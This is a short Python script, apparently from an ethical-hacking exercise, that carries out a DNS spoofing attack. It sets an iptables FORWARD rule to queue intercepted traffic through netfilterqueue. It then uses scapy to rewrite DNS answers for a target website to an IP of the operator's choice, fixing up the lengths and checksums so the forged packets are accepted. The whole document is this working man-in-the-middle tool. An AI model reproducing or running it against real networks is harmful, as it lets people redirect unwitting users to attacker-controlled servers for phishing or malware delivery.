import netfilterqueue
import subprocess
import scapy.all as scapy
import sys
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--ip", dest="ip", help="Ip to the dns packet response")
    parser.add_argument("-w", "--website", dest="website", help="Web site to spoof the dns")
    options = parser.parse_args()
    if not options.ip:
        parser.error("[-] Please specify a ip, use --help for more info")
    if not options.website:
        parser.error("[-] Please specify a website, use --help for more info")
    return options

def run_terminal_command(command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        error_message = e.output.decode("utf-8") 
        if "Operation not permitted" in error_message:
            print("[Permission] You should run this as root or with sudo")
        else:
            print(error_message)
        sys.exit()
    else:
        return result

def create_network_queue():
    print("[+] Creating network queue")
    run_terminal_command("iptables -I FORWARD -j NFQUEUE --queue-num 0")

def reset_iptables():
    print("[+] Reseting iptables")
    run_terminal_command("iptables --flush")

def process_packet(packet):
    global options
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if options.website in qname.decode():
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata=options.ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            packet.set_payload(bytes(scapy_packet))
    packet.accept()

try:
    options = get_arguments()
    create_network_queue()
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt as err:
    reset_iptables()
    print("[-] Finishing program")